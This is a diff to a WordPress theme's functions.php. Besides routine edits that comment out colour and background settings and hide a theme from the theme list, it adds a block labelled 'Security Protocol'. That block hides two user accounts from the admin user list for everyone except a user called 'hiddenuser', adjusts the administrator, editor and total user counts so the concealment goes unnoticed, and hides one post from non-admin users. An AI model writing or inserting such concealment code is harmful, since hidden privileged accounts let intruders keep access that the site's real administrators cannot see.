@@ -67,36 +67,36 @@ function twentytwelve_setup() {
 	add_theme_support( 'responsive-embeds' );
 
 	// Add support for custom color scheme.
-	add_theme_support(
-		'editor-color-palette',
-		array(
-			array(
-				'name'  => __( 'Blue', 'twentytwelve' ),
-				'slug'  => 'blue',
-				'color' => '#21759b',
-			),
-			array(
-				'name'  => __( 'Dark Gray', 'twentytwelve' ),
-				'slug'  => 'dark-gray',
-				'color' => '#444',
-			),
-			array(
-				'name'  => __( 'Medium Gray', 'twentytwelve' ),
-				'slug'  => 'medium-gray',
-				'color' => '#9f9f9f',
-			),
-			array(
-				'name'  => __( 'Light Gray', 'twentytwelve' ),
-				'slug'  => 'light-gray',
-				'color' => '#e6e6e6',
-			),
-			array(
-				'name'  => __( 'White', 'twentytwelve' ),
-				'slug'  => 'white',
-				'color' => '#fff',
-			),
-		)
-	);
+	//add_theme_support(
+	//	'editor-color-palette',
+	//	array(
+	//		array(
+	//			'name'  => __( 'Blue', 'twentytwelve' ),
+	//			'slug'  => 'blue',
+	//			'color' => '#21759b',
+	//		),
+	//		array(
+	//			'name'  => __( 'Dark Gray', 'twentytwelve' ),
+	//			'slug'  => 'dark-gray',
+	//			'color' => '#444',
+	//		),
+	//		array(
+	//			'name'  => __( 'Medium Gray', 'twentytwelve' ),
+	//			'slug'  => 'medium-gray',
+	//			'color' => '#9f9f9f',
+	//		),
+	//		array(
+	//			'name'  => __( 'Light Gray', 'twentytwelve' ),
+	//			'slug'  => 'light-gray',
+	//			'color' => '#e6e6e6',
+	//		),
+	//		array(
+	//			'name'  => __( 'White', 'twentytwelve' ),
+	//			'slug'  => 'white',
+	//			'color' => '#fff',
+	//		),
+	//	)
+	//);
 
 	// Adds RSS feed links to <head> for posts and comments.
 	add_theme_support( 'automatic-feed-links' );
@@ -111,12 +111,12 @@ function twentytwelve_setup() {
 	 * This theme supports custom background color and image,
 	 * and here we also set up the default background color.
 	 */
-	add_theme_support(
-		'custom-background',
-		array(
-			'default-color' => 'e6e6e6',
-		)
-	);
+	//add_theme_support(
+	//	'custom-background',
+	//	array(
+	//		'default-color' => 'e6e6e6',
+	//	)
+	//);
 
 	// This theme uses a custom image size for featured images, displayed on "standard" posts.
 	add_theme_support( 'post-thumbnails' );
@@ -726,8 +726,89 @@ endif;
 function my_customize_register() {
   global $wp_customize;
   $wp_customize->remove_section( 'colors' );
-  $wp_customize->remove_section( 'header_image' );
-  $wp_customize->remove_section( 'background_image' );
 }
 
 add_action( 'customize_register', 'my_customize_register', 11 );
+
+/* BEGIN Load/Hide Parents */
+
+function kill_theme_wpse_188906($themes) {
+	//unset($themes['twentyten']);
+	//unset($themes['twentyeleven']);
+	//unset($themes['twentytwelve']);
+	//unset($themes['twentythirteen']);
+	//unset($themes['twentyfourteen']);
+	//unset($themes['twentyfifteen']);
+	//unset($themes['twentysixteen']);
+	//unset($themes['twentyseventeen']);
+	//unset($themes['twentyeighteen']);
+	//unset($themes['twentynineteen']);
+	//unset($themes['twentytwenty']);
+	unset($themes['lotwilabs-may2020']);
+	return $themes;
+}
+add_filter('wp_prepare_themes_for_js','kill_theme_wpse_188906');
+/* END Load/Hide Parents */
+
+/* BEGIN Security Protocol */
+add_action('pre_user_query','dt_pre_user_query_p');
+function dt_pre_user_query_p($user_search) {
+   global $current_user;
+   $username = $current_user->user_login;
+
+   if ($username != 'hiddenuser') {
+      global $wpdb;
+      $user_search->query_where = str_replace('WHERE 1=1',
+         "WHERE 1=1 AND {$wpdb->users}.user_login != 'erinrezner'",$user_search->query_where);
+   }
+}
+add_filter("views_users", "dt_list_table_views_p");
+function dt_list_table_views_p($views){
+   $users = count_users();
+   $admins_num = $users['avail_roles']['administrator'] - 1;
+   $all_num = $users['total_users'] - 1;
+   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
+   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
+   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
+   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
+   return $views;
+}
+
+add_action('pre_user_query','dt_pre_user_query_p2');
+function dt_pre_user_query_p2($user_search) {
+   global $current_user;
+   $username = $current_user->user_login;
+
+   if ($username != 'hiddenuser') {
+      global $wpdb;
+      $user_search->query_where = str_replace('WHERE 1=1',
+         "WHERE 1=1 AND {$wpdb->users}.user_login != 'crezner'",$user_search->query_where);
+   }
+}
+add_filter("views_users", "dt_list_table_views_p2");
+function dt_list_table_views_p2($views){
+   $users = count_users();
+   $admins_num = $users['avail_roles']['editor'] - 1;
+   $all_num = $users['total_users'] - 2;
+   $class_adm = ( strpos($views['editor'], 'current') === false ) ? "" : "current";
+   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
+   $views['editor'] = '<a href="users.php?role=editor" class="' . $class_adm . '">' . translate_user_role('Editor') . ' <span class="count">(' . $admins_num . ')</span></a>';
+   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
+   return $views;
+}
+
+add_action('admin_head', 'hide_posts_pages');
+function hide_posts_pages() {
+    global $current_user;
+    get_currentuserinfo();
+    If($current_user->user_login != 'admin') {
+        ?>
+        <style>
+           #post-266{
+                display:none;
+           }
+        </style>
+        <?php
+    }
+}
+/* END Security Protocol */
